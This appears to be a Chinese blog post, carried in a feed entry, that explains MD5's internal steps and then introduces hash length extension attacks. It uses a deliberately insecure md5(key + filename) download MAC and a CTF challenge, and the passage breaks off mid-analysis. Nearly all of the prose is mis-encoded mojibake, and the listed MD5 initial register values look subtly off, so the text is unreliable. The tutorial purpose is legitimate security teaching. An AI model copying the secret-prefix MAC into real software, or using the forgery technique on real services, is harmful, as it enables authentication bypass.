        <content type="html"><![CDATA[<h1 id="ä¸€ã€MD5å“ˆå¸Œç®—æ³•"><a href="#ä¸€ã€MD5å“ˆå¸Œç®—æ³•" class="headerlink" title="ä¸€ã€MD5å“ˆå¸Œç®—æ³•"></a>ä¸€ã€MD5å“ˆå¸Œç®—æ³•</h1><h2 id="1-1-MD5ç®€ä»‹"><a href="#1-1-MD5ç®€ä»‹" class="headerlink" title="1.1 MD5ç®€ä»‹"></a>1.1 MD5ç®€ä»‹</h2><p>MD5ï¼ˆMessage Digest Algorithm 5ï¼‰æ˜¯ä¸€ç§å¹¿æ³›ä½¿ç”¨çš„åŠ å¯†æ•£åˆ—å‡½æ•°ï¼Œå®ƒå¯ä»¥äº§ç”Ÿä¸€ä¸ª128ä½ï¼ˆ16å­—èŠ‚ï¼‰çš„æ•£åˆ—å€¼ï¼ˆhash valueï¼‰ï¼Œé€šå¸¸ç”¨ä¸€ä¸ª32ä½çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œä¸”å…·æœ‰ä¸å¯é€†æ€§ï¼ˆå³ç†è®ºä¸Šä»æ•£åˆ—å€¼æ— æ³•æ¨å¯¼å‡ºæ˜æ–‡ï¼‰ã€‚MD5ç”±Ron Riveståœ¨1991å¹´è®¾è®¡ï¼Œæœ€åˆè¢«ç”¨æ¥ä½œä¸ºä¸€ç§å®‰å…¨çš„å¯†ç æ•£åˆ—ç®—æ³•ã€‚å®ƒæ¥æ”¶ä»»æ„é•¿åº¦çš„è¾“å…¥ï¼Œå¹¶äº§ç”Ÿä¸€ä¸ªå›ºå®šé•¿åº¦çš„è¾“å‡ºï¼Œè¿™ä¸ªè¾“å‡ºè¢«è®¤ä¸ºæ˜¯è¾“å…¥æ•°æ®çš„â€œæŒ‡çº¹â€ã€‚ç„¶è€Œï¼Œç”±äºåæ¥å‘ç°MD5å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œå®ƒä¸å†è¢«æ¨èç”¨äºå¯†ç å­˜å‚¨ç­‰å®‰å…¨æ•æ„Ÿçš„åº”ç”¨ã€‚å°½ç®¡å¦‚æ­¤ï¼ŒMD5ä»ç„¶è¢«ç”¨äºä¸€äº›éå®‰å…¨ç›¸å…³çš„åœºåˆï¼Œæ¯”å¦‚æ–‡ä»¶å®Œæ•´æ€§æ£€æŸ¥ã€‚</p><h3 id="1-1-1-php-ä¸­md5å‡½æ•°çš„ç”¨æ³•ç¤ºä¾‹"><a href="#1-1-1-php-ä¸­md5å‡½æ•°çš„ç”¨æ³•ç¤ºä¾‹" class="headerlink" title="1.1.1 php ä¸­md5å‡½æ•°çš„ç”¨æ³•ç¤ºä¾‹"></a>1.1.1 php ä¸­md5å‡½æ•°çš„ç”¨æ³•ç¤ºä¾‹</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test string"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">=</span> php5.6 index.php6f8db599de986fab7a21625b7916589c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="1-1-2-å“ˆå¸Œå‡½æ•°ä¸åŠ å¯†å‡½æ•°çš„åŒºåˆ«"><a href="#1-1-2-å“ˆå¸Œå‡½æ•°ä¸åŠ å¯†å‡½æ•°çš„åŒºåˆ«" class="headerlink" title="1.1.2 å“ˆå¸Œå‡½æ•°ä¸åŠ å¯†å‡½æ•°çš„åŒºåˆ«"></a>1.1.2 å“ˆå¸Œå‡½æ•°ä¸åŠ å¯†å‡½æ•°çš„åŒºåˆ«</h3><p>å“ˆå¸Œå°†ç›®æ ‡è½¬æ¢ä¸ºå…·æœ‰ç›¸åŒé•¿åº¦çš„ã€ä¸å¯é€†çš„æ‚å‡‘å­—ç¬¦ä¸²ï¼›</p><p>åŠ å¯†åˆ™æ˜¯å°†ç›®æ ‡è½¬åŒ–ä¸ºä¸åŒé•¿åº¦çš„ã€å¯é€†çš„å¯†æ–‡ï¼Œé•¿åº¦ä¸€èˆ¬éšæ˜æ–‡å¢é•¿è€Œå¢åŠ ï¼›</p><h3 id="1-1-3-å¸¸è§çš„å“ˆå¸Œç®—æ³•ä»‹ç»"><a href="#1-1-3-å¸¸è§çš„å“ˆå¸Œç®—æ³•ä»‹ç»" class="headerlink" title="1.1.3 å¸¸è§çš„å“ˆå¸Œç®—æ³•ä»‹ç»"></a>1.1.3 å¸¸è§çš„å“ˆå¸Œç®—æ³•ä»‹ç»</h3><p>å½“å‰æœ€å¸¸ç”¨çš„å“ˆå¸Œç®—æ³•æœ‰<code>MD5</code>ã€<code>SHA-1</code>ã€<code>SHA-2ï¼ˆSHA-224ã€SHA-256ã€SHA-384ï¼Œå’ŒSHA-512å¹¶ç§°ä¸ºSHA-2ï¼‰</code>ç­‰ã€‚</p><h2 id="1-2-md5å“ˆå¸Œç®—æ³•æµç¨‹è¯¦è§£"><a href="#1-2-md5å“ˆå¸Œç®—æ³•æµç¨‹è¯¦è§£" class="headerlink" title="1.2 md5å“ˆå¸Œç®—æ³•æµç¨‹è¯¦è§£"></a>1.2 md5å“ˆå¸Œç®—æ³•æµç¨‹è¯¦è§£</h2><h3 id="1-2-0-æ­¥éª¤æ¦‚è§ˆ"><a href="#1-2-0-æ­¥éª¤æ¦‚è§ˆ" class="headerlink" title="1.2.0 æ­¥éª¤æ¦‚è§ˆ"></a>1.2.0 æ­¥éª¤æ¦‚è§ˆ</h3><p>MD5ç®—æ³•çš„è¯¦ç»†æµç¨‹å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š</p><p>1ï¼‰æ˜æ–‡å¡«å……</p><p>2ï¼‰åˆå§‹åŒ–å˜é‡</p><p>3ï¼‰åˆ†å—å¤„ç†</p><p>4ï¼‰å¾ªç¯å‹ç¼©å‡½æ•°å¤„ç†</p><p>5ï¼‰æ›´æ–°å¯„å­˜å™¨</p><p>6ï¼‰ç”Ÿæˆå“ˆå¸Œå€¼</p><p>å…·ä½“çš„æ•°æ®å¤„ç†æµç¨‹å¦‚å›¾æ‰€ç¤ºï¼š</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.36.49.png" alt="ç®—æ³•æ•°æ®å¤„ç†æµç¨‹æ¦‚è§ˆ" style="zoom:80%;"><h3 id="1-2-1-æ˜æ–‡å¡«å……"><a href="#1-2-1-æ˜æ–‡å¡«å……" class="headerlink" title="1.2.1 æ˜æ–‡å¡«å……"></a>1.2.1 æ˜æ–‡å¡«å……</h3><p>MD5ä»¥512bitä¸ºåˆ†å—å¤„ç†è¾“å…¥ä¿¡æ¯ï¼Œæ¯ä¸ªåˆ†å—åˆè¢«åˆ†ä¸º16*32çš„å­åˆ†ç»„ï¼Œæœ€ç»ˆè¾“å‡ºä¸º4*32çš„åˆ†ç»„ï¼Œå³32ä½çš„16è¿›åˆ¶å­—ç¬¦ä¸²ã€‚</p><ul><li>å¡«å……</li></ul><p>è¾“å…¥ä¿¡æ¯çš„é•¿åº¦(bit)å¯¹512æ±‚ä½™ä¸ç­‰äº448æ—¶ï¼Œä½¿ç”¨OneAndZeroeså¯¹è¾“å…¥ä¿¡æ¯è¿›è¡Œå¡«å……ä½¿å¾—å¯¹512æ±‚ä½™448ã€‚</p><p>å‡è®¾å¯¹â€abcâ€è¿›è¡ŒMD5è®¡ç®—ï¼Œå¡«å……æ­¥éª¤ï¼š</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.32.09.png" alt="æ˜æ–‡å¡«å……ç¤ºæ„å›¾" style="zoom:50%;"><ul><li>è®°å½•ä¿¡æ¯é•¿åº¦</li></ul><p>å¡«å……å®Œæˆåï¼Œç”¨64bitå­˜å‚¨ä¿¡æ¯çš„é•¿åº¦ï¼Œâ€abcâ€å…±æœ‰24bitï¼Œå³0x18bitï¼Œè®°å½•çš„æ¶ˆæ¯é•¿åº¦ä¸ºï¼š</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.33.18.png" alt="é•¿åº¦è®°å½•" style="zoom:50%;"><h3 id="1-2-2-åˆå§‹åŒ–å˜é‡"><a href="#1-2-2-åˆå§‹åŒ–å˜é‡" class="headerlink" title="1.2.2 åˆå§‹åŒ–å˜é‡"></a>1.2.2 åˆå§‹åŒ–å˜é‡</h3><p>MD5çš„å“ˆå¸Œç»“æœé•¿åº¦ä¸º128ä½ï¼ŒæŒ‰æ¯32ä½åˆ†æˆä¸€ç»„å…±4ç»„ã€‚è¿™4ç»„ç»“æœæ˜¯ç”±4ä¸ªåˆå§‹å€¼Aã€Bã€Cã€Dç»è¿‡ä¸æ–­æ¼”å˜å¾—åˆ°ã€‚ç®—æ³•åˆå§‹åŒ–å››ä¸ª32ä½çš„å¯„å­˜å™¨Aã€Bã€Cã€Dï¼Œè¿™äº›å¯„å­˜å™¨åŒæ—¶ç”¨äºå­˜å‚¨ä¸­é—´è®¡ç®—ç»“æœ</p><p>MD5çš„å®˜æ–¹å®ç°ä¸­ï¼ŒAã€Bã€Cã€Dçš„åˆå§‹å€¼å¦‚ä¸‹ï¼ˆ16è¿›åˆ¶ï¼‰ï¼š</p><p>A=0x01234567</p><p>B=0x89ABCDEF</p><p>C=0xFEDCBA98</p><p>D=0x76543210</p><h3 id="1-2-3-åˆ†å—å¤„ç†"><a href="#1-2-3-åˆ†å—å¤„ç†" class="headerlink" title="1.2.3 åˆ†å—å¤„ç†"></a>1.2.3 åˆ†å—å¤„ç†</h3><p>å°†å¡«å……åçš„æ•°æ®æŒ‰ç…§512ä½ï¼ˆ64å­—èŠ‚ï¼‰ä¸€å—è¿›è¡Œå¤„ç†ï¼Œæ¯å—åŒ…å«16ä¸ª32ä½å­—ã€‚</p><h3 id="1-2-4-å¾ªç¯å‹ç¼©å‡½æ•°å¤„ç†"><a href="#1-2-4-å¾ªç¯å‹ç¼©å‡½æ•°å¤„ç†" class="headerlink" title="1.2.4 å¾ªç¯å‹ç¼©å‡½æ•°å¤„ç†"></a>1.2.4 å¾ªç¯å‹ç¼©å‡½æ•°å¤„ç†</h3><p>å¯¹æ¯ä¸ª512ä½çš„æ•°æ®å—è¿›è¡Œå››è½®å¾ªç¯å‹ç¼©å‡½æ•°å¤„ç†ï¼Œæ¯è½®å¤„ç†åŒ…æ‹¬å››ä¸ªæ­¥éª¤ï¼šFå‡½æ•°ã€Gå‡½æ•°ã€Hå‡½æ•°å’ŒIå‡½æ•°ã€‚è¿™äº›éçº¿æ€§å‡½æ•°åœ¨å¾ªç¯å‹ç¼©å‡½æ•°å¤„ç†ä¸­èµ·ç€é‡è¦ä½œç”¨ã€‚</p><p>ä¸»è¦æµç¨‹æ˜¯ä»¥512ä½çš„åˆ†å—ä¸ºå•ä½ï¼Œæ¯ä¸€åˆ†å—ç»è¿‡4è½®å¾ªç¯ï¼Œæ¯è½®å¾ªç¯16æ¬¡è¿­ä»£ï¼Œè¾“å‡º128ä½çš„ç»“æœï¼Œå­˜æ”¾åœ¨ç¼“å†²åŒºä¸­ï¼Œä½œä¸ºä¸‹ä¸€è½®å¾ªç¯ç¼“å†²åŒºçš„è¾“å…¥ã€‚</p><p>4è½®å¾ªç¯çš„é€»è¾‘å¦‚å›¾æ‰€ç¤ºï¼š</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.42.19.png" alt="512bitçš„æ•°æ®å¤„ç†æµç¨‹" style="zoom:50%;"><p>ä»ç¼“å†²åŒºè¾“å…¥128ä½ï¼Œä»æ¶ˆæ¯åˆ†ç»„è¾“å…¥512ä½ï¼Œè¾“å‡ºç»“æœ128ä½ï¼Œè¦æ³¨æ„ç»“æœæ˜¯ç”±å¾ªç¯çš„ç»“æœåŠ ä¸Šç¼“å†²åŒºçš„å€¼å¾—åˆ°çš„(åŠ æ³•ä¸ºæ¨¡$2^32$åŠ æ³•)ã€‚Aï¼ŒBï¼ŒCï¼ŒDå°±æ˜¯å“ˆå¸Œå€¼çš„å››ä¸ªåˆ†ç»„ã€‚æ¯ä¸€æ¬¡å¾ªç¯éƒ½ä¼šè®©æ—§çš„ABCDäº§ç”Ÿæ–°çš„ABCDã€‚ä¸€å…±è¿›è¡Œå¤šå°‘æ¬¡å¾ªç¯å‘¢ï¼Ÿç”±åŸæ–‡é•¿åº¦å†³å®šã€‚å‡è®¾å¤„ç†åçš„åŸæ–‡é•¿åº¦æ˜¯Mï¼Œä¸»å¾ªç¯æ¬¡æ•° = M / 512ï¼Œæ¯ä¸ªä¸»å¾ªç¯ä¸­åŒ…å« ï¼ˆ512/32ï¼‰ * 4 = 64 æ¬¡å­å¾ªç¯ã€‚ä¸Šé¢è¿™å¼ å›¾æ‰€è¡¨è¾¾çš„æ˜¯å•æ¬¡å­å¾ªç¯çš„æµç¨‹ã€‚</p><p>æ¯è½®å¾ªç¯ä¸­å•æ¬¡è¿­ä»£çš„é€»è¾‘å¦‚å›¾æ‰€ç¤ºï¼š</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2010.59.48.png" alt="å•è½®å¾ªç¯ä¸­çš„å•æ¬¡è¿­ä»£é€»è¾‘" style="zoom:50%;"><p>æ¯è½®å¾ªç¯è¿­ä»£è¿ç®—çš„é€»è¾‘ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>å¯¹Aè¿­ä»£ï¼ša <span class="token operator">&lt;</span>â€”â€” b+<span class="token punctuation">((</span>a+g<span class="token punctuation">(</span>b,c,d<span class="token punctuation">)</span>+X<span class="token punctuation">[</span>k<span class="token punctuation">]</span>+T<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;&lt;</span>s<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>ç¼“å†²åŒºï¼ˆA,B,C,D<span class="token punctuation">)</span>ä½œå¾ªç¯è½®æ¢ï¼š<span class="token punctuation">(</span>B,C,D,A<span class="token punctuation">)</span> <span class="token operator">&lt;</span>â€”â€”<span class="token punctuation">(</span>A,B,C,D<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>aï¼Œbï¼Œcï¼Œdæ˜¯ç¼“å†²åŒºçš„å½“å‰å€¼</li><li>gæ˜¯4ä¸ªè½®å‡½æ•°ä¹‹ä¸€ï¼Œè¾“å…¥è¾“å‡ºéƒ½æ˜¯<code>32bit</code>ï¼Œè¿›è¡Œä¸åŒçš„é€»è¾‘è¿ç®—</li><li><code>&lt;&lt;&lt;s</code>ï¼ˆCLSï¼ˆsï¼‰ï¼‰æ˜¯æŒ‡æŠŠ<code>bit32</code>å¾ªç¯å·¦ç§»<code>s</code>ä½ï¼Œ<code>s</code>å¯æŸ¥è¡¨å¾—åˆ°</li><li><code>X[k]</code>æ˜¯å½“å‰å¤„ç†æ¶ˆæ¯åˆ†ç»„çš„ç¬¬<code>k</code>ä¸ª<code>32bit</code>ï¼ˆä¸€å…±512/32=16ä¸ªå­—ï¼‰ï¼Œåœ¨æ¯ä¸€è½®å¾ªç¯ä¸­éƒ½ç”±ä¸åŒçš„å…¬å¼è®¡ç®—å‡ºæ¥</li><li><code>T[i]</code>é€šè¿‡æŸ¥è¡¨å¾—åˆ°ï¼Œ32bitå­—</li><li>æ‰€æœ‰çš„åŠ æ³•éƒ½æ˜¯æ¨¡$2^32$åŠ æ³•</li></ul><p>4ä¸ªè½®å‡½æ•°é€»è¾‘å¦‚å›¾æ‰€ç¤ºï¼š</p><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2011.05.00.png" alt="4ä¸ªè½®å‡½æ•°" style="zoom:50%;"><p>æ¯è½®å¾ªç¯ä¸­<code>X[k]</code>æ‰€å–çš„<code>k</code>çš„è®¡ç®—æ–¹æ³•ä¸ºï¼š</p><p>å–<code>j</code>ä¸ºå½“å‰è¿­ä»£è½®æ¬¡</p><ol><li>ç¬¬ä¸€è½®å¾ªç¯ï¼š<code>k = j</code></li><li>ç¬¬äºŒè½®å¾ªç¯ï¼š<code>k = (1 + 5 * j) % 16</code></li><li>ç¬¬ä¸‰è½®å¾ªç¯ï¼š<code>k = (5 + 3 * j) % 16</code></li><li>ç¬¬å››è½®å¾ªç¯ï¼š<code>k = (7 * j) % 16</code></li></ol><h3 id="1-2-5-æ›´æ–°å¯„å­˜å™¨"><a href="#1-2-5-æ›´æ–°å¯„å­˜å™¨" class="headerlink" title="1.2.5 æ›´æ–°å¯„å­˜å™¨"></a>1.2.5 æ›´æ–°å¯„å­˜å™¨</h3><p>æ ¹æ®æ¯è½®çš„è®¡ç®—ç»“æœæ›´æ–°å¯„å­˜å™¨Aã€Bã€Cã€Dçš„å€¼ã€‚</p><h3 id="1-3-6-ç”Ÿæˆå“ˆå¸Œå€¼"><a href="#1-3-6-ç”Ÿæˆå“ˆå¸Œå€¼" class="headerlink" title="1.3.6 ç”Ÿæˆå“ˆå¸Œå€¼"></a>1.3.6 ç”Ÿæˆå“ˆå¸Œå€¼</h3><p>æœ€åä¸€è½®å¾—åˆ°çš„ç»“æœç»è¿‡é«˜ä½ä½äº’æ¢åå°±æ˜¯æœ€ç»ˆçš„ç»“æœã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">6f8db599de986fab7a21625b7916589c<span class="token assign-left variable">A</span><span class="token operator">=</span>0x99b58d6f<span class="token assign-left variable">B</span><span class="token operator">=</span>0xab6f98de<span class="token assign-left variable">C</span><span class="token operator">=</span>0x5b62217a<span class="token assign-left variable">D</span><span class="token operator">=</span>0x9c581679<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A B C D åˆ†åˆ«æŒ‰å­—èŠ‚åè½¬åæ‹¼æ¥æ„æˆæœ€åçš„å“ˆå¸Œå€¼ã€‚</p><h1 id="äºŒã€å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åŸç†"><a href="#äºŒã€å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åŸç†" class="headerlink" title="äºŒã€å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åŸç†"></a>äºŒã€å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»åŸç†</h1><h2 id="2-1-æ”»å‡»åœºæ™¯"><a href="#2-1-æ”»å‡»åœºæ™¯" class="headerlink" title="2.1 æ”»å‡»åœºæ™¯"></a>2.1 æ”»å‡»åœºæ™¯</h2><h3 id="2-1-1-æ”»å‡»åœºæ™¯1-æ–‡ä»¶ä¸‹è½½æƒé™éªŒè¯"><a href="#2-1-1-æ”»å‡»åœºæ™¯1-æ–‡ä»¶ä¸‹è½½æƒé™éªŒè¯" class="headerlink" title="2.1.1 æ”»å‡»åœºæ™¯1-æ–‡ä»¶ä¸‹è½½æƒé™éªŒè¯"></a>2.1.1 æ”»å‡»åœºæ™¯1-æ–‡ä»¶ä¸‹è½½æƒé™éªŒè¯</h3><p>Message Authentication Codes (MACs)æ˜¯ç”¨äºéªŒè¯ä¿¡æ¯çœŸå®æ€§çš„ç®—æ³•ã€‚æœ€ç®€å•çš„MACç®—æ³•æ˜¯è¿™æ ·çš„ï¼šæœåŠ¡å™¨æŠŠkeyå’Œmessageè¿æ¥åˆ°ä¸€èµ·ï¼Œç„¶åç”¨æ‘˜è¦ç®—æ³•å¦‚<code>MD5</code>æˆ–<code>SHA1</code>å–å‡ºæ‘˜è¦ã€‚</p><p>ä¾‹å¦‚æœ‰ä¸€ä¸ªç½‘ç«™ï¼Œåœ¨ç”¨æˆ·ä¸‹è½½æ–‡ä»¶ä¹‹å‰éœ€éªŒè¯ä¸‹è½½æƒé™ã€‚</p><p>è¿™ä¸ªç½‘ç«™ä¼šç”¨å¦‚ä¸‹çš„ç®—æ³•äº§ç”Ÿä¸€ä¸ªå…³äºæ–‡ä»¶åçš„MACï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">def Create_MAC<span class="token punctuation">(</span>key, filename<span class="token punctuation">)</span>   <span class="token builtin class-name">return</span> Digest::MD5.hexdigest<span class="token punctuation">(</span>key + filename<span class="token punctuation">)</span>end<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>keyå¯¹äºæ”»å‡»è€…æ¥è¯´æ˜¯æœªçŸ¥çš„ã€‚</p><p>ç”¨æˆ·è¯·æ±‚ä¸‹è½½test.pdfæ–‡ä»¶æ—¶æäº¤å¦‚ä¸‹è¯·æ±‚ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://www.example.com/download?file<span class="token operator">=</span>test.pdf<span class="token operator">&amp;</span><span class="token assign-left variable">mac</span><span class="token operator">=</span>ca21cf672b66a5ee6fa7fc7c1c314ff3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å½“ç”¨æˆ·å‘èµ·è¯·æ±‚è¦ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">def verify_mac<span class="token punctuation">(</span>key, filename, userMAC<span class="token punctuation">)</span>    validMAC <span class="token operator">=</span> create_MAC<span class="token punctuation">(</span>key, filename<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>validMAC <span class="token operator">==</span> userMAC<span class="token punctuation">)</span> <span class="token keyword">do</span>        initiateDownload<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span>        displayError<span class="token punctuation">(</span><span class="token punctuation">)</span>    endend<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯æ ¹æ®keyå’Œç”¨æˆ·æäº¤çš„æ–‡ä»¶åç”Ÿæˆä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œè·Ÿç”¨æˆ·æäº¤çš„å“ˆå¸Œå€¼åšæ¯”å¯¹ï¼Œæ¯”å¯¹æˆåŠŸæ‰ä¼šå…è®¸ä¸‹è½½æ–‡ä»¶ï¼Œè¿™ç§æƒ…å†µä¸‹è¦æ±‚æ–‡ä»¶åå’Œç”¨æˆ·æä¾›çš„macå€¼éƒ½æ˜¯åˆæ³•çš„ã€‚</p><p>æœ¬æ„æ˜¯é€šè¿‡keyçš„ä¿å¯†æ€§æ¥éªŒè¯èº«ä»½ï¼Œå› ä¸ºæ­£å¸¸æƒ…å†µä¸‹åªæœ‰æœåŠ¡ç«¯å’Œåˆæ³•å®¢æˆ·ç«¯æ‰æŒæ¡keyã€‚</p><p>è¿™æ ·ï¼Œåªæœ‰å½“ç”¨æˆ·æ²¡æœ‰æ“…è‡ªæ›´æ”¹æ–‡ä»¶åæ—¶æœåŠ¡å™¨æ‰ä¼šæ‰§è¡Œ<code>initiateDownload()</code>å¼€å§‹ä¸‹è½½ã€‚</p><p>ä½†æ˜¯è¿™ç§ç”ŸæˆMACçš„æ–¹å¼ï¼Œä¼šç»™æ”»å‡»è€…åœ¨æ–‡ä»¶ååæ·»åŠ è‡ªå®šä¹‰çš„å­—ç¬¦ä¸²ç•™ä¸‹éšæ‚£ã€‚ </p><p>è¿™ç§æ–¹æ³•å°±æ˜¯å“ˆå¸Œé•¿åº¦æ‹“å±•æ”»å‡»ã€‚</p><p>æ”»å‡»ç»“æœï¼šä¸çŸ¥é“keyã€ä¸çŸ¥é“åˆæ³•æ–‡ä»¶åï¼Œä½†æ˜¯èƒ½é€šè¿‡éªŒè¯ã€‚</p><h3 id="2-1-2-æ”»å‡»åœºæ™¯2"><a href="#2-1-2-æ”»å‡»åœºæ™¯2" class="headerlink" title="2.1.2 æ”»å‡»åœºæ™¯2"></a>2.1.2 æ”»å‡»åœºæ™¯2</h3><p>åœ¨ä¸€é“webé¢˜ç›®ä¸­é‡åˆ°äº†ä»¥ä¸‹åˆ¤æ–­: <code>if ($COOKIE["md5hash"] === md5($secret . $input))</code></p><p>åœ¨è¯¥é¢˜ç›®ä¸­æˆ‘ä»¬å¯ä»¥æŒæ¡çš„å‚æ•°æœ‰<code>md5hash</code>ã€<code>input</code>çš„å€¼ï¼Œ<code>secret</code>çš„md5å€¼å’Œé•¿åº¦ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è®©è¿™ä¸ªåˆ¤æ–­é€šè¿‡ã€‚</p><p>éš¾ç‚¹åœ¨äºï¼šä¸çŸ¥é“$secretçš„æƒ…å†µä¸‹ï¼Œä¼ é€’ä¸€ä¸ªå“ˆå¸Œå€¼å’Œinputï¼Œä½¿å¾—å“ˆå¸Œå€¼===md5($secret.$input)ã€‚</p><h2 id="2-2-å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ç®€ä»‹"><a href="#2-2-å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ç®€ä»‹" class="headerlink" title="2.2 å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ç®€ä»‹"></a>2.2 å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ç®€ä»‹</h2><p>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ï¼ˆHash Length Extension Attacksï¼‰æ˜¯ä¸€ç§é’ˆå¯¹æŸäº›åŠ å¯†æ•£åˆ—å‡½æ•°çš„æ”»å‡»æ‰‹æ®µï¼Œç‰¹åˆ«é€‚ç”¨äºé‚£äº›åŸºäºMerkleâ€“DamgÃ¥rdç»“æ„çš„ç®—æ³•ï¼Œå¦‚MD5å’ŒSHA-1ã€‚è¿™ç±»æ”»å‡»çš„æ ¸å¿ƒåœ¨äºï¼Œå¦‚æœä½ çŸ¥é“ä¸€ä¸ªæ¶ˆæ¯ï¼ˆmessageï¼‰å’Œå¯†é’¥ï¼ˆkeyï¼‰çš„ç»„åˆçš„å“ˆå¸Œå€¼ï¼Œå³ä½¿ä¸çŸ¥é“å¯†é’¥çš„å…·ä½“å€¼ï¼Œåªè¦çŸ¥é“å¯†é’¥çš„é•¿åº¦ï¼Œä½ å°±èƒ½åœ¨è¿™ä¸ªæ¶ˆæ¯åé¢æ·»åŠ é¢å¤–çš„ä¿¡æ¯ï¼Œå¹¶è®¡ç®—å‡ºæ–°çš„å“ˆå¸Œå€¼ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">md5<span class="token punctuation">(</span>xxxxx+<span class="token string">"plainText"</span><span class="token punctuation">)</span><span class="token operator">=</span>cdf1ea<span class="token punctuation">..</span>md5<span class="token punctuation">(</span>xxxxx+<span class="token string">"plainText"</span>+<span class="token string">"abcdfafa"</span><span class="token punctuation">)</span><span class="token operator">=</span>ade24242<span class="token punctuation">..</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ”»å‡»æ¡ä»¶ï¼š</p><ol><li>ï»¿ï»¿æ¶ˆæ¯å¯æ§å·²çŸ¥</li><li>ï»¿ï»¿å¯†é’¥é•¿åº¦å·²çŸ¥</li><li>ï»¿ï»¿ï»¿ä½¿ç”¨MD5åŠ å¯†ä¸”ç»“æœå¯çŸ¥</li></ol><h2 id="2-3-æ”»å‡»æ­¥éª¤"><a href="#2-3-æ”»å‡»æ­¥éª¤" class="headerlink" title="2.3 æ”»å‡»æ­¥éª¤"></a>2.3 æ”»å‡»æ­¥éª¤</h2><h3 id="2-3-1-ä»¥æŸCTFèµ›é¢˜ä¸ºä¾‹å­"><a href="#2-3-1-ä»¥æŸCTFèµ›é¢˜ä¸ºä¾‹å­" class="headerlink" title="2.3.1 ä»¥æŸCTFèµ›é¢˜ä¸ºä¾‹å­"></a>2.3.1 ä»¥æŸCTFèµ›é¢˜ä¸ºä¾‹å­</h3><ul><li>ä»£ç å¦‚ä¸‹ï¼š</li></ul><img src="/2024/11/29/mi-ma-xue-suan-fa-an-quan/ha-xi-chang-du-kuo-zhan-gong-ji/%E6%88%AA%E5%B1%8F2024-11-29%2014.21.21.png" alt="CTFèµ›é¢˜å®ä¾‹" style="zoom:50%;"><h3 id="2-3-2-æ¡ä»¶åˆ†æ"><a href="#2-3-2-æ¡ä»¶åˆ†æ" class="headerlink" title="2.3.2 æ¡ä»¶åˆ†æ"></a>2.3.2 æ¡ä»¶åˆ†æ</h3><p>ä»ä»£ç ä¸­å·²çŸ¥<code>$this-&gt;sess=md5($this-&gt;token.$this-&gt;username)</code>ï¼Œåœ¨ä¸ä¼ 